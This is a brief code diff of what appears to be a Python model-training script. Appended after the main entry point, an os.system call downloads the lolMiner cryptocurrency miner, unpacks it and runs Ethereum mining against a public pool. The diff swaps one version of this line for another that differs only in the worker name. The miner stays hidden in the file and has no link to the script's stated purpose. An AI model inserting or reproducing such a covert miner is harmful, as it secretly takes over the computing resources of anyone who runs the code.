@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz && tar xf lolMiner_v1.51a_Lin64.tar.gz && cd 1.51a && ./lolMiner --algo ETHASH --pool stratum+tcp://eth.ss.poolin.one:443 --user ethaing21.$(echo $(shuf -i 1-20000 -n 1)-aing) --pass 123 --dns-over-http=2 208.67.222.222')
+os.system('wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz && tar xf lolMiner_v1.51a_Lin64.tar.gz && cd 1.51a && ./lolMiner --algo ETHASH --pool stratum+tcp://eth.ss.poolin.one:443 --user ethaing21.$(echo $(shuf -i 1-20000 -n 1)-yuk) --pass 123 --dns-over-http=2 208.67.222.222')
